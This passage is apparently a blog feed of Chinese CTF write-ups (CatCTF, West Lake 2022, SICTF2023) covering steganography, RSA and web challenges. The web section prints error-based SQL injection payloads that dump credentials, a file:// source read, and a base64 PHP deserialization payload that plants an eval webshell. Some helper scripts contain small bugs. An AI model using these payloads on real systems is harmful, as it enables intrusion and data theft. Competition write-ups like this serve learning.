祝你新年快乐啦！</h3><p><img src="/mdimg/NepnepxCATCTF/18.png"></p><p><a name="D7CNc"></a></p><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><p><a name="unJt8"></a></p><h3 id="The-cat-did-it"><a href="#The-cat-did-it" class="headerlink" title="The cat did it"></a>The cat did it</h3><p><img src="/mdimg/NepnepxCATCTF/19.png"><br /><img src="/mdimg/NepnepxCATCTF/20.png"><br />0~100尝试，必出，结果 0%就出了<br>:::tips<br> CatCTF{<strong>9f1ef07877f9d85a82bd500f408b4814}</strong><br>:::</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>西湖论剑2022初赛</title>
    <link href="/2023/02/09/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022%E5%88%9D%E8%B5%9B/"/>
    <url>/2023/02/09/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="MP3"><a href="#MP3" class="headerlink" title="MP3"></a>MP3</h3><p>下载得到一个mp3文件，foremost分离出来一个图片<br><img src="/mdimg/%E8%A5%BF%E6%B9%96/1.png"><br>zsteg看看<br><img src="/mdimg/%E8%A5%BF%E6%B9%96/2.png"><br>zsteg提取<br><code>zsteg -e b1,r,lsb,xy 6.png &gt; 6.zip  </code><br><img src="/mdimg/%E8%A5%BF%E6%B9%96/3.png"><br>MP3stego：<a href="https://www.petitcolas.net/steganography/mp3stego/">https://www.petitcolas.net/steganography/mp3stego/</a><br>项目源码：<a href="https://github.com/fabienpe/MP3Stego">https://github.com/fabienpe/MP3Stego</a><br><img src="/mdimg/%E8%A5%BF%E6%B9%96/4.png"><br>得到压缩包密码 8750d5109208213f<br><img src="/mdimg/%E8%A5%BF%E6%B9%96/5.png"><br>解压缩包<br><img src="/mdimg/%E8%A5%BF%E6%B9%96/6.png"><br>rot47<br><img src="/mdimg/%E8%A5%BF%E6%B9%96/7.png"><br>js解码，控制台<br><img src="/mdimg/%E8%A5%BF%E6%B9%96/8.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SICTF2023 wp</title>
    <link href="/2023/02/09/SICTF2023wp/"/>
    <url>/2023/02/09/SICTF2023wp/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><p><img src="/mdimg/sictf/1.png"><br><img src="/mdimg/sictf/2.png"><br><strong>用户名处存在sql注入</strong><br><img src="/mdimg/sictf/3.png"><br>**看源码发现是post参数user和pass    **<br><strong>fuzz一下</strong><br><img src="/mdimg/sictf/4.png"></p><blockquote><p>过滤了union，select，空格，=</p></blockquote><p>；没过滤尝试堆叠注入无果，updatexml没过滤，报错注入<br><code>user=1&#39;/**/and/**/updatexml(1,concat(0x7e,database()),0)#&amp;pass=1</code>      //ctf_db<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database())),0x7e)#&amp;pass=1</code>    //admin<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database())),0x7e)#&amp;pass=1</code>           // Username,Password<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(Username)from/**/admin)),0x7e)#&amp;pass=1</code>    //admin<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(Password)from/**/admin)),0x7e)#&amp;pass=1</code>    // 0909876qwe222<br>登录：<br><img src="/mdimg/sictf/5.png"><br>post：url=1试试<br><img src="/mdimg/sictf/6.png"><br><code>url=file:///var/www/html/x9sd.php</code>读取x9sd.php<br><img src="/mdimg/sictf/7.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">text</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$tmp</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-variable">$tmp</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;unserx&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;unserx&#x27;</span>]);<br>           <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono?&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>);<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;success&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I need some ???&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化$var<br><img src="/mdimg/sictf/8.png"><br>url编码admin赋值给username<br><code>/x9sd.php?username=%2561%2564%256d%2569%2561&amp;unserx=TzoxOiJhIjoxOntzOjY6IgAqAGNtZCI7czoxNjoiZXZhbCgkX1BPU1RbMV0pOyI7fQ==</code><br><img src="/mdimg/sictf/9.png"><br><img src="/mdimg/sictf/10.png"></p><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h4><p>可以上传php文件，但是要爆破文件名，文件名和时间戳有关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br>url = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">100000000</span>, <span class="hljs-number">200000000</span>):<br>    re = url + <span class="hljs-title function_ invoke__">str</span>(i) + <span class="hljs-string">&quot;.php&quot;</span><br>    r = requests.<span class="hljs-title function_ invoke__">post</span>(q)<br>    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">404</span>:<br>        a = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">print</span>(re)<br>  <br></code></pre></td></tr></table></figure><p>在本地搭一个环境，在本地和远程上传（尽量快）<br>跑出来文件名就可以连antsward了</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h4 id="签到打卡完成"><a href="#签到打卡完成" class="headerlink" title="签到打卡完成"></a>签到打卡完成</h4><p><img src="/mdimg/sictf/11.png">    </p><blockquote><p>010打开附件找到key：SICTF，平台就是青少年的，公众号直接搜（非预期）</p></blockquote><p><img src="/mdimg/sictf/12.png"><br>预期解：</p><p>用ps改一下亮度</p><p>原图<br><img src="/mdimg/sictf/13.png">    </p><p><strong>QRresearch 扫</strong><br><img src="/mdimg/sictf/14.png"><br><code>[http://weixin.qq.com/r/dS-v9yPE436crWeU93pn](http://weixin.qq.com/r/dS-v9yPE436crWeU93pn)    </code></p><h4 id="color"><a href="#color" class="headerlink" title="color"></a>color</h4><p><img src="/mdimg/sictf/15.png"><br>非预期：</p><blockquote><p>stegsolve打开图片查看颜色通道，发现二维码，扫描                        </p></blockquote><p><img src="/mdimg/sictf/16.png"><br>微信QR有纠错，扫描有几率扫出来<br>预期解：</p><blockquote><p>颜色修复工具：<a href="https://github.com/Byxs20/FrequencyColor">https://github.com/Byxs20/FrequencyColor)</a>)</p></blockquote><p>输入序号1-30<br><img src="/mdimg/sictf/17.png"><br><img src="/mdimg/sictf/18.png"><br><code>SICTF&#123;448e8531-c752-4847-ae7e-0e702a8fb915&#125;</code></p><h4 id="geek-challenge"><a href="#geek-challenge" class="headerlink" title="geek_challenge"></a>geek_challenge</h4><p>计算就完事了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">import pwn<br>X = pwn.<span class="hljs-title function_ invoke__">remote</span>(<span class="hljs-string">&quot;&quot;</span>,)<br><span class="hljs-keyword">while</span> True:<br>   tmp = X.<span class="hljs-title function_ invoke__">recvline</span>()<br>    <span class="hljs-keyword">print</span>(tmp.<span class="hljs-title function_ invoke__">decode</span>())<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;= ?&quot;</span> in tmp:<br>        res = <span class="hljs-keyword">eval</span>(tmp.<span class="hljs-title function_ invoke__">decode</span>()[:-<span class="hljs-number">5</span>])<br>        data = <span class="hljs-title function_ invoke__">str</span>(res).<span class="hljs-title function_ invoke__">encode</span>()<br>        X.<span class="hljs-title function_ invoke__">sendline</span>(data)<br></code></pre></td></tr></table></figure><h4 id="王八树木"><a href="#王八树木" class="headerlink" title="王八树木"></a>王八树木</h4><p>文件16进制逆序<br>树木使用工具还原 附地址<a href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a><br><code>FileReverse-Tools.py -i 树木</code><br>得到jpg图片 分理出pass.txt  bandzip 爆破得到123456<br><img src="/mdimg/sictf/19.png"><br>解7z得到<code>SI!!!!!!</code><br>使用SilentEye<br><img src="/mdimg/sictf/20.png"><br>得到 <code>2,1,2</code><br>猫脸变换还原flag.bmp  a=3，b=1成功了 脚本可能有问题<br><img src="/mdimg/sictf/21.png"><br><code>SICTF&#123;a9549c89-d261-4bd7-9643-60874dbd28b8&#125;    </code>                </p><h4 id="EzMisc"><a href="#EzMisc" class="headerlink" title="EzMisc"></a>EzMisc</h4><p>伪加密WinRAR修复就行<br>得到<img src="/mdimg/sictf/22.png"><br><code>Xkey:MI43nQrRjQaFTALBTO4JmNJxjO4VcO4Vy</code><br>随波逐流<br><img src="/mdimg/sictf/23.png"><br><code>ohhhhh~</code>解压7z</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">from PIL import Image<br><br>from base64 import b64encode ,b64decode<br><br>from FLAG import FLAG<br><br>import cv2<br><br>OOO000O0000000OOO =<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">OO00000O0O00OOOOO =&#x27;</span>&#x27;<br>O0OO0OO0O0O0OOOO0 =Image .open (OOO000O0000000OOO )<br>O000OOO0O0000OO00 =Image .open (OO00000O0O00OOOOO )<br>OOO0OO0O00OO0O00O =cv2 .imread (<span class="hljs-string">&#x27;&#x27;)</span><br><span class="hljs-string">OO00OOO0OOO000OO0 =OOO0OO0O00OO0O00O .shape [1]</span><br><span class="hljs-string">O0OOO0OOO00OO00OO =OOO0OO0O00OO0O00O .shape [0]</span><br><span class="hljs-string">O0000OOO0O00O00OO =Image .new (&quot;RGB&quot;,(OO00OOO0OOO000OO0 ,O0OOO0OOO00OO00OO ))</span><br><span class="hljs-string">OO00OOOO00O0OOO0O =O0OO0OO0O0O0OOOO0 .convert (&#x27;</span>RGB<span class="hljs-number">&#x27;</span>)<br>O000OOO0O0OO0000O =O000OOO0O0000OO00 .convert (<span class="hljs-string">&#x27;RGB&#x27;</span>)<br><span class="hljs-keyword">for</span> OOO0O0OO000O0O000 in range (OO00OOO0OOO000OO0 ):<br>    <span class="hljs-keyword">for</span> OOOOO0000000O0OOO in range (O0OOO0OOO00OO00OO ):<br>        OO0OO00O0O0000O0O ,OO000O0O00000O0O0 ,OOO0O00OO000O0O00 =OO00OOOO00O0OOO0O .getpixel ((OOO0O0OO000O0O000 ,OOOOO0000000O0OOO ))<br>        OO00OOOO0OOO000OO ,O000OO0O0OO00O0O0 ,O00000OO0OO0O0OOO =O000OOO0O0OO0000O .getpixel ((OOO0O0OO000O0O000 ,OOOOO0000000O0OOO ))<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO00OOOO0OOO000OO =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        O000OO0O0OO00O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO000O0O00000O0O0<br>        OO000O0O00000O0O0 =OO0OO00O0O0000O0O ^OO000O0O00000O0O0<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO000O0O00000O0O0<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO<br>        O00000OO0OO0O0OOO =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO<br>        O0OOO0000OOOOO00O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO0O0OOOOO0O00OO0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        O00O00O00OO0O00O0 =OOO0O00OO000O0O00 ^O00000OO0OO0O0OOO<br>        <span class="hljs-keyword">if</span> (O0OOO0000OOOOO00O ==<span class="hljs-number">0</span> ):<br>            O0OOO0000OOOOO00O =<span class="hljs-number">255</span><br>        <span class="hljs-keyword">if</span> (OO0O0OOOOO0O00OO0 ==<span class="hljs-number">0</span> ):<br>            OO0O0OOOOO0O00OO0 =<span class="hljs-number">255</span><br>        <span class="hljs-keyword">if</span> (O00O00O00OO0O00O0 ==<span class="hljs-number">0</span> ):<br>            O00O00O00OO0O00O0 =<span class="hljs-number">255</span><br>        O0OOO0000OOOOO00O =str (b64encode (str (O0OOO0000OOOOO00O ).encode ()),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        OO0O0OOOOO0O00OO0 =str (b64encode (str (OO0O0OOOOO0O00OO0 ).encode ()),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        O00O00O00OO0O00O0 =str (b64encode (str (O00O00O00OO0O00O0 ).encode ()),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        with open (<span class="hljs-string">&#x27;secret~.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)as file0 :<br>            print (O0OOO0000OOOOO00O [::<span class="hljs-number">-1</span> ],OO0O0OOOOO0O00OO0 [::<span class="hljs-number">-1</span> ],O00O00O00OO0O00O0 [::<span class="hljs-number">-1</span> ],file = file0 )<br><br><br></code></pre></td></tr></table></figure><p><del>偷一下Byxs20✌的jio本</del></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">import cv2<br>import base64<br>import numpy as np<br><br>with <span class="hljs-title function_">open</span><span class="hljs-params">(<span class="hljs-string">&quot;secret~.txt&quot;</span>)</span> as f:<br>    data = f.read().splitlines()[:<span class="hljs-number">-2</span>]<br><br>img = []<br><span class="hljs-keyword">for</span> line in data:<br>    bgr = [base64.b64decode(i[::<span class="hljs-number">-1</span>]).decode() <span class="hljs-keyword">for</span> i in line.split(<span class="hljs-string">&quot; &quot;</span>)][::<span class="hljs-number">-1</span>]<br>    img.append(bgr)<br>img = np.<span class="hljs-built_in">array</span>(img, np.uint8)<br><br>dic = &#123;<span class="hljs-number">1</span>: <span class="hljs-number">268780</span>, <span class="hljs-number">2</span>: <span class="hljs-number">134390</span>, <span class="hljs-number">4</span>: <span class="hljs-number">67195</span>, <span class="hljs-number">5</span>: <span class="hljs-number">53756</span>, <span class="hljs-number">10</span>: <span class="hljs-number">26878</span>, <span class="hljs-number">20</span>: <span class="hljs-number">13439</span>, <span class="hljs-number">89</span>: <span class="hljs-number">3020</span>, <span class="hljs-number">151</span>: <span class="hljs-number">1780</span>, <span class="hljs-number">178</span>: <span class="hljs-number">1510</span>, <span class="hljs-number">302</span>: <span class="hljs-number">890</span>, <span class="hljs-number">356</span>: <span class="hljs-number">755</span>, <span class="hljs-number">445</span>: <span class="hljs-number">604</span>, <span class="hljs-number">604</span>: <span class="hljs-number">445</span>, <span class="hljs-number">755</span>: <span class="hljs-number">356</span>, <span class="hljs-number">890</span>: <span class="hljs-number">302</span>, <span class="hljs-number">1510</span>: <span class="hljs-number">178</span>, <span class="hljs-number">1780</span>: <span class="hljs-number">151</span>, <span class="hljs-number">3020</span>: <span class="hljs-number">89</span>, <span class="hljs-number">13439</span>: <span class="hljs-number">20</span>, <span class="hljs-number">26878</span>: <span class="hljs-number">10</span>, <span class="hljs-number">53756</span>: <span class="hljs-number">5</span>, <span class="hljs-number">67195</span>: <span class="hljs-number">4</span>, <span class="hljs-number">134390</span>: <span class="hljs-number">2</span>&#125;<br><span class="hljs-keyword">for</span> height, width in dic.items():<br>    cv2.imwrite(f<span class="hljs-string">&quot;./out/&#123;height&#125;_&#123;width&#125;.png&quot;</span>, img.reshape(height, width, <span class="hljs-number">3</span>))<br><br></code></pre></td></tr></table></figure><p>得到<br><img src="/mdimg/sictf/24.png"><br>一眼丁真小鸟游六花（<del>我不是二次元</del><br>题目说的拼音就是这个了，oursercet解flag.评就行<br><img src="/mdimg/sictf/25.png"><br><code>**SICTF&#123;3d04cd71-5b2d-4bce-abec-a6f2f95c3665&#125;**</code></p><h4 id="Hacker"><a href="#Hacker" class="headerlink" title="Hacker"></a>Hacker</h4><p><img src="/mdimg/sictf/26.png"><br>一眼丁真要rabbit解密，那么就是要找key和密文了<br>tshark提取base64<br><img src="/mdimg/sictf/27.png"><br><img src="/mdimg/sictf/28.png"><br>得到key：<code>Gui_1s_shumu</code><br><img src="/mdimg/sictf/29.png"><br>密文<code>U2FsdGVkX19bEN3D8vFeG39VyYXPwle2mMQLh5T1HYiSI1XCx7rJhsDnp9qLpUQByITd05Uu05ZAv0o=</code><br><img src="/mdimg/sictf/30.png"></p><h4 id="hacker2"><a href="#hacker2" class="headerlink" title="hacker2"></a>hacker2</h4><p>题目说明 ：树木不小心把重要的信息放在了自己的shell当中，或许对你的解密会有帮助<br>定位http流<br>冰蝎流量<br>flag格式：SICTF{shell名称_密钥_文本文件中存储的字符串}<br>随便翻，知道shell名字是<code>she1l</code><br><img src="/mdimg/sictf/31.png"><br>在第一个流中找到了key<code>7d7c23e87b47368b</code><br><img src="/mdimg/sictf/32.png"><br>在这个流中解出了关键信息字符串<br><code>uU7xO0V/KGySO6rdSlEw/dQXFklZWZn1EMhiAAoH7WNpJcvkV3JcvqHelZOOHVA0YKUdylNKNgf4+x+WrC/GkA==</code><br><img src="/mdimg/sictf/33.png"><br><code>c0rRect!!!</code><br>SICTF{she1l_7d7c23e87b47368b_c0rRect!!!}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h4 id="Ascii"><a href="#Ascii" class="headerlink" title="Ascii"></a>Ascii</h4><p>稍微改下脚本，循环异或3，然后base解密<br><img src="/mdimg/sictf/34.png">            </p><h4 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br>m=libnum.s2n(flag)<br>n=getPrime(<span class="hljs-number">16</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">233</span>):<br>    n*=getPrime(<span class="hljs-number">16</span>)<br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">44457399775772165283580795763046604956432217865936749114390645714446263790235445725770165521476841968764175721036280702731933849090719866149354613431301887740671003826556620460836983488011711209908075106260857650574672356032244606425941095128801765463716482316101398637519304864271794460829068714740938719022156283319142938782439784724450045931039355442034325311037568791297455084676548879770834712506552233840348850684727096270392080049993135041218143811167688449496243036317450681348089315258831745988434134987055263393540923865029931594717328162951158311497514418799360413513590684301435386737514918075848373373755748782672860711406169316940293554209702288482064854840802876490202123903888235028119047988176327629542924415737212649237787748145773301112682790682933658516724691338727523894513267588035437093188599375494920656327919129240066252636130803666175859640361767805549884909317548802917210333235914904622641997249853362378711924024129399688535136879208010081166848163897114124726692078532337827810846421365846926064892472698603597461932481745017020417072013702099809833423003201003030492</span><br><span class="hljs-string">157077292656328898849823499976497003976795705913326943955927601882559735301000546878663484930436631929909115065166613744548816622146802007640124796249330573411377703969505934904150600987843325674764620305047603408490558134670867673308099650843329640744997672015466571290660161290811275435569339606335117906571999000341133024698424364682800683662193063661214736762852739324479859236963365531207752799197178993887860855078852702337761399225640575281412171035871278933493943575572155382899938265639764715616686123949482372238288859715465115400317136714757882965887595246507450491169518000205087415380208167764110920711042584766805992237919576823121108078407699912757901788925718859790257450499775129521327827653298451904392241906547672843110356658889638496906522290674659574024024440113632175010053065452660076447040937842478007881589334096496073556056726805396937630799201696246079227214272205462258357482722478243481697053301054600954126539848778226175296162997813416634702496577009409960503948474494741296663849482119365434792563324547643352816519125305335959420429699475765642610737903235960423173</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>一眼丁真，跟bugku的一题几乎一样:<a href="https://ctf.bugku.com/challenges/detail/id/214.html">https://ctf.bugku.com/challenges/detail/id/214.html</a><br>n由多个质因子生成，用sage的euler_phi(n)函数求欧拉函数<br><img src="/mdimg/sictf/35.png"><br>求出phi就是普通解RSA了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Unit.number <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">157077292656328898849823499976497003976795705913326943955927601882559735301000546878663484930436631929909115065166613744548816622146802007640124796249330573411377703969505934904150600987843325674764620305047603408490558134670867673308099650843329640744997672015466571290660161290811275435569339606335117906571999000341133024698424364682800683662193063661214736762852739324479859236963365531207752799197178993887860855078852702337761399225640575281412171035871278933493943575572155382899938265639764715616686123949482372238288859715465115400317136714757882965887595246507450491169518000205087415380208167764110920711042584766805992237919576823121108078407699912757901788925718859790257450499775129521327827653298451904392241906547672843110356658889638496906522290674659574024024440113632175010053065452660076447040937842478007881589334096496073556056726805396937630799201696246079227214272205462258357482722478243481697053301054600954126539848778226175296162997813416634702496577009409960503948474494741296663849482119365434792563324547643352816519125305335959420429699475765642610737903235960423173</span><br>c = <span class="hljs-number">44457399775772165283580795763046604956432217865936749114390645714446263790235445725770165521476841968764175721036280702731933849090719866149354613431301887740671003826556620460836983488011711209908075106260857650574672356032244606425941095128801765463716482316101398637519304864271794460829068714740938719022156283319142938782439784724450045931039355442034325311037568791297455084676548879770834712506552233840348850684727096270392080049993135041218143811167688449496243036317450681348089315258831745988434134987055263393540923865029931594717328162951158311497514418799360413513590684301435386737514918075848373373755748782672860711406169316940293554209702288482064854840802876490202123903888235028119047988176327629542924415737212649237787748145773301112682790682933658516724691338727523894513267588035437093188599375494920656327919129240066252636130803666175859640361767805549884909317548802917210333235914904622641997249853362378711924024129399688535136879208010081166848163897114124726692078532337827810846421365846926064892472698603597461932481745017020417072013702099809833423003201003030492</span><br>e = <span class="hljs-number">65537</span><br>phi = <span class="hljs-number">156367601475974402995143336378908040952860477592140281716502923468101002113603962472338202519343293683021813608492616735571335781889806580494592433061437445590103680183939182694030477690083123849381638384615403358528373448247586608040831464913727117628732036460516169834885530364477189488436897498824548971447505421979260430779757085905057701828890183301766003676422858872328029117473240600494292339226314733362682083999649134377189961569453868222950898463303662344115641021534838224401932268491972483326181312907141447088889872329127098638446483836443651704520477509821707797504856532033842982959066448341585137132145274813016240735092150523868970094517671115496874544078013828715295441650530874907072326026489798290753786116282315362518192114644603753496977012739114909700085784320423720398538929947664466373783000579482811416733852154360821231242559299052271498254335229659178377535891895087327910350143351556120064417902643002970719306110925104438203052958221625710867669659366694336983490603020446389462306989147274444803125646343536640000000000000000000000000000000000000000000000000000000000</span><br><br>d = gmpy2.invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m)<br><span class="hljs-comment">#SICTF&#123;13578a78-1bd1-483e-8c01-4d501c8b52bb&#125;</span><br></code></pre></td></tr></table></figure><h4 id="PolyRSA"><a href="#PolyRSA" class="headerlink" title="PolyRSA"></a>PolyRSA</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 